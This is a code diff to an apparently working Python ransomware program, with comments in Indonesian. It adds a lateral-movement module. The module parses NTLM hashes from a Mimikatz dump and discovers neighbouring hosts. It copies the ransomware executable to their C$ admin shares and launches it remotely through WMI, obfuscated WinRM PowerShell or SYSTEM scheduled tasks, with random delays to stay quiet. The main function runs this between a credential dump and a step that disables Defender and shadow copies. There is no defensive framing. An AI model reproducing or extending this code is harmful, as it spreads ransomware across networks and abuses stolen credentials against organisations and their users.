@@ -50,6 +50,177 @@ IOCTL_BYPASS_PROTECTION = 0x2222014
 IOCTL_DISABLE_CALLBACKS = 0x2222018
 IOCTL_UNLOAD_DRIVER = 0x222201C
 
+class LateralMovement:
+    """Lateral Movement Stealthy dengan WinRM Obfuscated + Mimikatz PTH + Immediate Execution (2026 Style)"""
+    
+    def __init__(self, ransomware_instance):
+        self.rw = ransomware_instance
+        self.successful_infections = []
+        self.credentials = []                   # (username, ntlm_hash)
+        self.max_targets = 8                    # Batasi agar tidak noisy
+        self.delay_min = 5.0
+        self.delay_max = 15.0
+
+    def parse_mimikatz_credentials(self):
+        """Parse username + NTLM hash dari hasil Mimikatz dump"""
+        try:
+            import glob
+            dump_pattern = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "syslog_*.txt")
+            dump_files = glob.glob(dump_pattern)
+            
+            if not dump_files:
+                print("[-] Mimikatz dump not found → fallback to current user")
+                user = os.getenv("USERNAME")
+                domain = os.getenv("USERDOMAIN", ".")
+                self.credentials.append((f"{domain}\\{user}", None))
+                return
+            
+            for dump_file in dump_files:
+                with open(dump_file, "r", encoding="utf-8", errors="ignore") as f:
+                    content = f.read()
+                
+                lines = content.splitlines()
+                current_user = None
+                for line in lines:
+                    line = line.strip()
+                    if "Username :" in line:
+                        current_user = line.split(":", 1)[1].strip()
+                    elif "NTLM     :" in line and current_user and current_user not in ["-", ""]:
+                        ntlm = line.split(":", 1)[1].strip()
+                        if len(ntlm) == 32 and ntlm != "00000000000000000000000000000000":
+                            self.credentials.append((current_user, ntlm))
+                            print(f"[+] PTH Credential parsed: {current_user}")
+        except Exception as e:
+            print(f"[-] Mimikatz parse failed: {e}")
+            # Fallback
+            user = os.getenv("USERNAME")
+            self.credentials.append((user, None))
+
+    def get_nearby_hosts(self):
+        """Discovery sangat ringan (ARP cache + nearby IP)"""
+        hosts = []
+        try:
+            output = subprocess.check_output("arp -a", shell=True, 
+                                           creationflags=subprocess.CREATE_NO_WINDOW).decode(errors='ignore')
+            for line in output.splitlines():
+                parts = line.split()
+                if len(parts) > 0 and parts[0].count('.') == 3:
+                    ip = parts[0]
+                    if ip != socket.gethostbyname(socket.gethostname()):
+                        hosts.append(ip)
+        except:
+            pass
+        
+        # Fallback nearby IP (±20 dari IP lokal)
+        try:
+            base = '.'.join(socket.gethostbyname(socket.gethostname()).split('.')[:3])
+            my_octet = int(socket.gethostbyname(socket.gethostname()).split('.')[-1])
+            for i in range(max(1, my_octet - 20), min(254, my_octet + 20)):
+                ip = f"{base}.{i}"
+                if ip not in hosts:
+                    hosts.append(ip)
+        except:
+            pass
+        
+        return list(set(hosts))[:self.max_targets + 5]
+
+    def copy_to_target(self, host):
+        """Copy ransomware ke target via SMB Admin Share"""
+        try:
+            exe_name = os.path.basename(sys.executable)
+            remote_path = f"\\\\{host}\\C$\\Windows\\Temp\\{exe_name}"
+            
+            result = subprocess.run(f'copy "{sys.executable}" "{remote_path}"', 
+                                    shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=8)
+            return result.returncode == 0
+        except:
+            return False
+
+    def execute_remote_payload(self, host, username=None):
+        """Eksekusi ransomware di mesin target setelah copy berhasil"""
+        exe_name = os.path.basename(sys.executable)
+        remote_path = f"C:\\Windows\\Temp\\{exe_name}"
+        
+        try:
+            # 1. WMI Direct Execution (paling cepat)
+            if username:
+                cmd_base = f'wmic /node:"{host}" /user:"{username}"'
+            else:
+                cmd_base = f'wmic /node:"{host}"'
+            
+            exec_cmd = f'{cmd_base} process call create "{remote_path}"'
+            result = subprocess.run(exec_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
+                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
+            
+            if result.returncode == 0:
+                print(f"[+] Executed via WMI → {host}")
+                return True
+
+            # 2. WinRM Obfuscated Execution
+            ps_raw = f"""
+            Invoke-Command -ComputerName {host} -ScriptBlock {{
+                Start-Process -FilePath "{remote_path}" -WindowStyle Hidden -ErrorAction SilentlyContinue
+            }} -ErrorAction SilentlyContinue
+            """
+            obf_cmd = self.rw.generate_obfuscated_powershell(ps_raw, layers=4)
+            subprocess.run(obf_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=12)
+            print(f"[+] Executed via WinRM obfuscated → {host}")
+            return True
+
+        except:
+            # 3. Fallback Scheduled Task + immediate run
+            task_name = f"WinSysChk_{random.randint(1000,9999)}"
+            task_cmd = f'schtasks /create /s {host} /tn "{task_name}" /tr "{remote_path}" /sc once /st 00:01 /ru SYSTEM /f'
+            if username:
+                task_cmd = f'schtasks /create /s {host} /u "{username}" /tn "{task_name}" /tr "{remote_path}" /sc once /st 00:01 /ru SYSTEM /f'
+            
+            subprocess.run(task_cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=8)
+            subprocess.run(f'schtasks /run /s {host} /tn "{task_name}"', 
+                           shell=True, creationflags=subprocess.CREATE_NO_WINDOW, timeout=5)
+            
+            print(f"[+] Executed via Scheduled Task → {host}")
+            return True
+
+    def lateral_move_to_host(self, host):
+        """Proses lengkap untuk satu host: copy → execute"""
+        if not self.copy_to_target(host):
+            return False
+        
+        # Coba eksekusi dengan credential PTH
+        for username, ntlm in self.credentials:
+            if self.execute_remote_payload(host, username):
+                self.successful_infections.append(host)
+                return True
+        
+        # Fallback tanpa credential khusus
+        if self.execute_remote_payload(host):
+            self.successful_infections.append(host)
+            return True
+        
+        return False
+
+    def start(self):
+        """Fungsi utama - panggil setelah credential dump"""
+        print("[*] Starting stealth lateral movement (WinRM + PTH + Immediate Execution)...")
+        
+        self.parse_mimikatz_credentials()
+        hosts = self.get_nearby_hosts()
+        
+        for host in hosts:
+            if host == socket.gethostbyname(socket.gethostname()):
+                continue
+                
+            print(f"[*] Attempting lateral to {host}...")
+            self.lateral_move_to_host(host)
+            
+            # Delay acak sangat penting untuk menghindari noisy
+            time.sleep(random.uniform(self.delay_min, self.delay_max))
+        
+        print(f"\n[+] Lateral movement completed → {len(self.successful_infections)} additional hosts infected")
+        return self.successful_infections
+
 
 class RansomWare:
     def __init__(self):
@@ -1223,7 +1394,12 @@ def main():
         rw.credential_dump_lotl_mimikatz()
     except:
         pass
-    
+    try:
+        lateral = LateralMovement(rw)
+        lateral.start()    
+    except Exception as e:
+        print(f"[-] Lateral movement error: {e}")
+        
     # Final cleanup
     rw.lotl_disable_defender_and_shadow()
     
